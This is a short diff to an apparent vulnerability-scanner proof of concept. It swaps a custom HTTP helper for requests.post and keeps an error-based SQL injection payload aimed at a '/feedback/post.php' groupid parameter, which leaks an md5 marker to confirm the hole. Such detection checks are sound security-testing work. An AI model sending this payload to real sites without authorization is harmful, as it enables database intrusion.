@@ -36,9 +36,9 @@ class Poc(ABPoc):
             url = arg
             url = url + '/feedback/post.php'
             post_data = "act=formsend&company=e&content=&groupid=11' AND (SELECT 3264 FROM(SELECT COUNT(*),CONCAT(0x7164647a71,(MID((IFNULL(CAST(md5(3.14) AS CHAR),0x20)),1,50)),0x7177767771,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'cmij'='cmij&ImgCode=e&name=e&qq=e&tel=e&title=e"
-            code, head, body, _, _ = hh.http('-d "%s" %s' % (post_data,url))
-            if code == 200:
-                if body and body.find('4beed3b9c4a886067de0e3a094246f78') != -1:
+            req = requests.post(url, data=post_data)
+            if req.status_code == 200:
+                if '4beed3b9c4a886067de0e3a094246f78' in req.text:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
